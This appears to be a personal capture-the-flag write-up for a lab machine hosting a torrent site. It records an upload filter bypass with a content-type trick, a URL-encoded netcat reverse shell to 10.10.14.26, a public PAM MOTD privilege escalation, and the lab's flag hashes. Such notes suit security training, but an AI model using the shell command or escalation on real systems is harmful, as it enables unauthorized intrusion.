**LESSONS LEARNED : **
- Always use gobuster medium and common , do note on this
- If Creating your own torrent file wont do , just download real one
- Always check for files especially user home files
- Update finding files skill / note
- Update upload bypass notes


Port 22
=========
 OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)

Port 80
============
/test
Suhosin Patch 0.9.7

/torrent
can register account to login and upload file but php not allowed


/rename
allow file rename
?filename=index.html&newfilename=test.html
No such file or directory in /var/www/rename/index.php on line 4

upload kali image downloaded from kali official website
edit torrent and add screenshot

file extension : test1.php
```
content-type : image/png
```
looks like file name is not filtered but content-type is filtered


/torret/uploads/ewqo9129321-test1.php
```
?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.26%204567%20%3E%2Ftmp%2Ff
```
cat /etc/passwd got user george
at /home/george found .cache/motd.legal-displayed 

quick google "motd.legal-displayed exploit" found
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation

wget it from localhost to remote machine and run
./exploit.sh

root : dac9f0feac2821f258795a2570209e36
user : 07315850a09835d330fae25fa6df0612


